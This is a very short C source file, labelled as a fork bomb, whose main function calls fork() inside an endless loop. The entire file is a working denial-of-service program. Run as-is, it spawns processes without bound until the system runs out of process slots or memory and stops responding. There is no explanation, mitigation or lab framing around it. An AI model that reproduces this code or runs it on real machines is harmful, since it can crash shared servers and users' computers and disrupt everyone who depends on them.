// File: 303.c
// Fork bomb

#include <unistd.h>

int main(){
	for (;;){
		fork();
	}
}
